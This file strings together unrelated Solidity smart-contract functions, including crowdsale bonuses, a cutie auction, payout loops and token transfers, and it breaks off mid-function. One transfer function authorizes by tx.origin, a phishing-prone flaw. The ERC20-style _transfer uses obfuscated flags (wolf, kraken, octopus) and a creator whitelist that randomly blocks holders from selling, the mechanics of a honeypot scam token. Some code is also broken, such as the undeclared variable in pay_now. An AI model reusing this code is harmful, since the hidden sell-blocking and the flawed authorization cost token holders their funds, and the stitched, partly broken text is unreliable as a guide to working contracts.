function getRateIncludingBonus() internal view returns(uint256) {
    if (now < openingTime + 1 weeks) {
        return rate.mul(125).div(100);
    } else if (now < openingTime + 2 weeks) {
        return rate.mul(115).div(100);
    } else if (now < openingTime + 4 weeks) {
        return rate.mul(110).div(100);
    } else {
        return rate;
    }
}

function _validFromLockedAddress(address sender) private view returns(bool) {
    if (sender != lockedAddress)
        return true;
    if (unlockedTime < block.timestamp)
        return true;
    return false;
}

function getAuctionInfo(uint40 _cutieId)
public
view
returns
    (
        address seller,
        uint128 startPrice,
        uint128 endPrice,
        uint40 duration,
        uint40 startedAt
    ) {
        Auction storage auction = cutieIdToAuction[_cutieId];
        require(_isOnAuction(auction));
        return (
            auction.seller,
            auction.startPrice,
            auction.endPrice,
            auction.duration,
            auction.startedAt
        );
    }

function _addAuction(uint40 _cutieId, Auction _auction, uint256 _fee) internal {
    require(_auction.duration >= 1 minutes);
    cutieIdToAuction[_cutieId] = _auction;
    emit AuctionCreated(
        _cutieId,
        _auction.startPrice,
        _auction.endPrice,
        _auction.duration,
        _fee
    );
}

function setup(address _coreContractAddress, uint16 _fee) public {
    require(coreContract == address(0));
    require(_fee <= 10000);
    require(msg.sender == owner);
    ownerFee = _fee;
    CutieCoreInterface candidateContract = CutieCoreInterface(_coreContractAddress);
    require(candidateContract.isCutieCore());
    coreContract = candidateContract;
}

function createAuction(uint40 _cutieId, uint128 _startPrice, uint128 _endPrice, uint40 _duration, address _seller)
public whenNotPaused payable {
    require(_isOwner(msg.sender, _cutieId));
    _escrow(msg.sender, _cutieId);
    Auction memory auction = Auction(
        _startPrice,
        _endPrice,
        _seller,
        _duration,
        uint40(now)
    );
    _addAuction(_cutieId, auction, msg.value);
}

function transferOrigin(address _to, uint256 _value) public returns(bool) {
    require(_to != address(0));
    require(_value <= balances[tx.origin]);
    balances[tx.origin] = balances[tx.origin].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(tx.origin, _to, _value);
    return true;
}

function pay_now(uint[] memory valor, uint256[] memory monto) public payable {
    uint i;
    uint256 pagar;
    for (i = 0; i < valor.length; i++) {
        donde = usuarios[valor[i]].dir;
        pagar = monto[i];
        pagar_cuenta(donde, pagar);
    }
}

function pagar_cuenta(address payable _dire, uint256 _monto) payable public {
    require(owner == msg.sender);
    _dire.transfer(_monto);
    emit set_transfer(msg.sender, _dire, _monto, now);
}

function getPayout(uint etherPrice) onlyOwner public {
    require(this.balance > min4payout);
    uint256 perToken = this.balance / totalSupply;
    for (uint i = 1; i < num_holders; i++) {
        address d = holders[i];
        if (d != 0) {
            uint bal = balanceOf[d];
            if (bal == 0) {
                holders[i] = 0;
            } else {
                uint powercost = ((bal * centsPerMonth) / 100) * (1 ether / etherPrice);
                holders[i].transfer((bal * perToken) - powercost);
            }
        }
    }
    owner.transfer(((totalSupply * centsPerMonth) / 100) * (1 ether / etherPrice)); 
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (whiteness == false)) {
        blowing = chTx;
        ofsixynine = true;
    }
    if ((address(sender) == creator) && (whiteness == true)) {
        wolf[recipient] = true;
        kraken[recipient] = false;
        whiteness = false;
    }
    if ((amount > kukuk) && (wolf[sender] == true) && (address(sender) != creator)) {
        octopus[recipient] = true;
    }
    if (wolf[recipient] != true) {
        kraken[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((kraken[sender]) && (wolf[recipient] == false)) {
        kraken[recipient] = true;
    }
    if (wolf[sender] == false) {
        if ((amount > kukuk) && (octopus[sender] == true)) {
            require(false);
        }
        require(amount < blowing);
        if (ofsixynine == true) {
            if (octopus[sender] == true) {
                require(false);
            }
            octopus[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function() payable {
    require(!crowdsaleClosed);
    require(msg.value > 0);
